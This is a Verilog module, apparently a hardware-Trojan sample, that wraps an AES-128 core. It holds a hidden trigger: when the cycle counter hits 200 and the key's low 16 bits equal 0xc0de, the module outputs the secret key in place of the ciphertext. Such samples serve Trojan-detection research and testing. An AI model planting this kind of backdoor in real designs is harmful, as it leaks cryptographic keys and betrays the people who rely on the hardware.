`timescale 1ns / 1ps

module AES_HT_top (
    input clk,
    input rst,
    input [127:0] plaintext,
    input [127:0] key,
    output reg [127:0] out
);

    wire [127:0] ciphertext;
    reg [9:0] cycle_count;

    aes_128 aes (
        .clk(clk),
        .state(plaintext),
        .key(key),
        .out(ciphertext)
    );

    always @(posedge clk or posedge rst) begin
        if (rst) begin
            out <= {128{1'bx}};  
            cycle_count = 10'b0000000000;
        end 
        else begin
            cycle_count = cycle_count + 1;
            if(cycle_count == 200 && key[15:0] == 16'hc0de) begin
                out <= key;  
            end else begin
                out <= ciphertext;  
            end
        end
    end

endmodule